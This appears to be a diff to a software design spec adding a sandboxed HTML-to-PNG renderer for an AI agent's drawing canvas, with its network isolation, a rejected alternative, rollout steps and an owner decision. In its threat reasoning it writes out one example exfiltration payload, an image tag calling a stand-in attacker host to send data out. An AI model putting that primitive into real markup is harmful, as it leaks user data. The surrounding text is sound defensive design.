@@ -1,6 +1,13 @@
 # Agent Canvas — Draw, Annotate, Crop — Design Spec
 
-> **Status:** Scheduled · **Last verified:** 2026-08-16 · **Waves:** W0◻️ W1◻️ W2◻️ W3◻️ W4◻️ W5◻️ W6◻️ · **All five §10 decisions ratified by the owner 2026-08-16**
+> **Status:** In progress · **Last verified:** 2026-08-16 · **Waves:** W0✅ W1✅ W1b✅ W2◻️ W3◻️ W4◻️ W5◻️ W6◻️ · **§10 decisions 1–6 ratified by the owner 2026-08-16**
+
+> **W0/W1/W1b landed on-branch.** W0's *code* is complete (the `--image-min-tokens`
+> floor, `agent/grounding.py`, the EXIF fix, `POST /api/debug/grounding`); its
+> **measurement is still owed** — the coordinate base is pinned as `AUTO` (inferred per
+> response) until the probe is run on the box and the result recorded here. W1b added a
+> capability the plan did not originally scope: a general-purpose HTML→PNG renderer
+> (§3b), which is now the sanctioned path for any tool wanting rich visual output.
 
 > Reconciled with the root `CLAUDE.md` non-negotiables — the `look` vision call goes
 > through the LLM adapter (rule 1), every rendered PNG through the storage
@@ -41,6 +48,14 @@ is `qwen3.8-27b` (`llm/local_catalog.py:336`, dense 27B, `mmproj-F16.gguf`,
 `supports_vision=True`). OSWorld-Verified measures clicking precise pixel targets in
 real desktop GUIs; **84.3 is not a model that coin-flips on coordinates.** Earlier
 scoping assumed Qwen3-VL's ScreenSpot-Pro ~54%, which this checkpoint supersedes.
+
+**A fourth thing fell out of the design and is bigger than the canvas** (§3b): the
+box now has a general-purpose **HTML → PNG renderer**. Rendering model-authored markup
+server-side to pixels is what makes it *safe* — the PWA receives an image, never live
+DOM — which turns `DESIGN.md`'s refusal of model-authored markup from a constraint to
+work around into a boundary the design respects. The canvas is its first caller, not
+its owner; a later flowchart, comparison-table, or report-card tool renders through the
+same service.
 
 **What we are NOT building** (§9 carries the full list): a plotting op set —
 `render_chart`/`render_bars` already draw a real interactive chart and would compete
@@ -103,6 +118,53 @@ path. Pillow stays for the pixel-level work it already does (`sniff_image_media_
 `Image.crop()` in L3.
 
 ---
+
+## 3b. The `htmlrender` service — a general capability, not a canvas detail
+
+Owner decision (§10.6). The shape ops are worst at exactly what HTML is best at —
+wrapped multi-line text, lists, small tables, styled labels — and the representation
+evidence is one-sided: higher-level formats beat low-level primitives by ~17 points on
+the same models (VGBench), drawing competence tracks *coding* competence, and this
+model's headline gains are coding gains (Terminal-Bench 73.0, DeepSWE 42.2, Vision2Web
+62.9). Handing it a language it is genuinely fluent in beats a nine-op vocabulary it
+meets for the first time in a sidecar.
+
+**Rendering to pixels is the security argument, not a workaround for it.** `DESIGN.md`
+keeps a closed view registry and bars model-authored markup, URLs and colour from
+reaching the DOM. A server-side raster satisfies that completely: the model gets full
+CSS, and the PWA receives an image. An image cannot execute. This is why the service
+is worth building beyond the canvas — any later tool wanting a flowchart or a report
+card gets a sanctioned path instead of a reason to argue with the design system.
+
+**Shape.** A stock-stack sidecar (`deploy/htmlrender/`, Playwright + Chromium) exposing
+`POST /render {html,width,height,transparent}` → PNG. `jbrain/htmlrender.py` is the
+pinned client (base URL from config, never model-supplied), mirroring
+`vision/rapidocr.py`. Reached only by the api.
+
+**Two properties that must not be undone:**
+
+1. **Egress-free, twice.** The compose service sits on a network declared
+   `internal: true`, so the container has no route off the box at all, and the page
+   also aborts every non-`data:` request itself. The markup is untrusted input and
+   `<img src="http://attacker/?d=…">` is the obvious exfiltration primitive; neither
+   lock alone is worth betting owner data on.
+2. **It never receives owner images.** Blocks render TRANSPARENT at their own size and
+   `draw/compose.py` composites them over the photograph inside the firewall. A
+   health-scoped photo therefore never reaches a browser container, and the payload
+   stays small.
+
+**Rejected alternative: PyMuPDF `Story`.** Zero dependencies and it does render an
+HTML subset — verified working for background colour, font sizing, bold, lists, tables,
+em-dash and CJK. But it is a flow-layout engine, not a browser: flexbox is ignored and
+content overlaps, `border-radius` and `letter-spacing` are dropped, `position:absolute`
+lands wrong. A model writing ordinary CSS gets a *silently* mangled result, which is
+the worst failure mode available. Kept on the record because it remains the fallback if
+the sidecar is ever unavailable.
+
+**Degradation.** An empty `htmlrender_url`, an unreachable sidecar, or a block that
+fails to render is reported per-block and the rest of the figure still draws — the same
+partial-apply posture as the op fold (§6.1). The canvas never fails wholesale because
+one block did.
 
 ## 4. The scene model — retained, id-addressed, fractional
 
@@ -230,8 +292,14 @@ So every op is one flat object — `{op, x, y, x2, y2, w, h, text, tone, size, w
 fill, id, dx, dy}`, only `op` required — with allowed values in the `op` field's
 *description* and validated in the handler.
 
-**Op vocabulary (9, deliberately high-level):** `text`, `line`, `arrow`, `rect`,
-`callout`, `label_box`, `delete`, `move`, `clear`.
+**Op vocabulary (10, deliberately high-level):** `text`, `line`, `arrow`, `rect`,
+`callout`, `label_box`, `html`, `delete`, `move`, `clear`.
+
+`html` (§3b) places a browser-rendered block at a rect. It is an **op, not a fourth
+tool**, for two reasons: the surface stays at three names, and a rendered block stays
+an *element* — movable and deletable by id like any other mark, because the op owns the
+rect while the markup only fills it. That preserves edit-by-id, which is the one thing
+a raw HTML document would have cost (§4.1).
 
 `callout` (bubble + leader line to a target point) and `label_box` (box + caption) are
 the two composite primitives that do the actual work of L1 — each is one op instead of
@@ -449,6 +517,16 @@ per wave, exactly one PR per wave, CI green before merge.
 - **Exit:** the convention (`0–1` vs `0–1000`) is measured on the live box, pinned in
   `grounding.py`, and the hit rate recorded in the PR.
 
+### W1b — The `htmlrender` service *(§3b; runs with W1)*
+- `deploy/Dockerfile.htmlrender` + `deploy/htmlrender/server.py` (Playwright/Chromium,
+  lazy launch + idle unload on the `rapidocr` pattern), the compose service, and the
+  `render` network declared `internal: true`.
+- `jbrain/htmlrender.py` — the pinned client; `settings.htmlrender_url`; wired on
+  `app.state` beside `rapidocr` so any later tool can reach it.
+- `jbrain/draw/compose.py` — the one module in `draw` that touches the network: renders
+  each `html` block transparent and composites inside the firewall.
+- `scripts/dev-setup.sh` pre-pulls the Chromium base image (rule 8).
+
 ### W1 — The renderer, pure and offline
 - `jbrain/draw/scene.py` — scene model, op validation, the fold, partial-apply
   reporting. `jbrain/draw/render.py` — PyMuPDF: marks, halos, arrowheads, callout
@@ -546,6 +624,7 @@ per wave, exactly one PR per wave, CI green before merge.
 | 10.3 | Model allowlist | **`qwen3.8-27b` + `qwen3.8-27b-q4` only** |
 | 10.4 | Loop budget | **3 looks / 10 calls / 12 crops** |
 | 10.5 | W4 interim fallback | **None — the lane waits for `image_set`** |
+| 10.6 | HTML lane | **Full browser sidecar (real CSS)** |
 
 **10.1 — separate `show_canvas` verb.** Follows the rule stated at
 `agents.py:181,228` (*"show/remove stay SEPARATE (distinct shapes)"*) and the
@@ -579,6 +658,18 @@ check. See §6.2 for why the ceiling still sits where repair rounds saturate.
 → N durable cards, shippable today with zero frontend change) was declined in favour of
 waiting for the one-call `image_set` gallery. **Consequence: W4 is hard-blocked on the
 three-mock GUI gate, and W5 is blocked behind W4.** Mitigation in §11.4.
+
+**10.6 — the HTML lane is a real browser, and the renderer is a general service.** The
+zero-dependency PyMuPDF `Story` option was evaluated with working renders of both what
+it does and what it silently drops (§3b) and rejected: flow layout is not what a model
+writing CSS expects. The owner chose the Chromium sidecar, and then made the sharper
+call that the render path should be **general-purpose rather than canvas-owned**,
+because getting an image back is precisely what removes the risk of model-authored
+markup and components. That reframing is why §3b is its own section: the canvas is the
+first consumer of a capability the box now has, not the owner of a private detail.
+Accepted costs, stated plainly: a third browser container (~1GB, idle-unloading), and
+a block edit means regenerating that block's markup rather than moving an element —
+though the block's *rect* still moves by id, which is why `html` is an op.
 
 ---
 
